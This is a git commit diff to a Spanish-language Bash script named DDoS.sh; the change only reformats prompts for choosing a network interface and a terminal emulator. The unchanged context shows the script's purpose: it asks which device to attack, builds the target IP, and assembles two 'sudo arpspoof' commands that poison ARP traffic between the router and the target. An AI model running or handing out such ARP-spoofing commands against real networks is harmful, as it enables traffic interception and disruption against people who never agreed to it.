d0d96d35c522c91af82d1e079477d6b15bfeca7a
hscript06 <pablotejerinagp@gmail.com>
2025-12-12 10:26:35 +0100

    Improve user prompts for network interface selection

--- DDoS.sh
+++ DDoS.sh
@@ -41,7 +41,10 @@ read -p "que dispositivo desea atacar (ingrese el host ID de la ip): " host_id
 ip_objetivo="${ip%.*}.$host_id"
 echo "el objetivo sera: $ip_objetivo"
 interfaz_red_defecto=$(ip -o addr show | grep "$ip" | awk '{print $2}')
-read -p "ingrese la interfaz de red a usar  (1-por defecto en tu sistema:$interfaz_red_defecto/2-manual) (1-2)" pregunta_interfaz
+echo "ingrese la interfaz de red a usar:"
+echo "1-por defecto en tu sistema:$interfaz_red_defecto"
+echo "2-manual"
+read -p "(1-2):" pregunta_interfaz
     if [[ $pregunta_interfaz == "1" ]]; then
         interfaz_red="$interfaz_red_defecto"
     elif [[ $pregunta_interfaz == "2" ]]; then
@@ -69,7 +72,7 @@ elif [[ $direcciones == "2" ]]; then
     echo "7- Terminator"
     echo "8- Deepin Terminal"
     echo "9- Otro / Ninguno"
-    read -p ":" interfaz_grafica
+    read -p "(1-9):" interfaz_grafica
     inverso="sudo arpspoof -i $interfaz_red -t $router $ip_objetivo"
     directo="sudo arpspoof -i $interfaz_red -t $ip_objetivo $router"
     if [[ $interfaz_grafica == "1" ]]; then
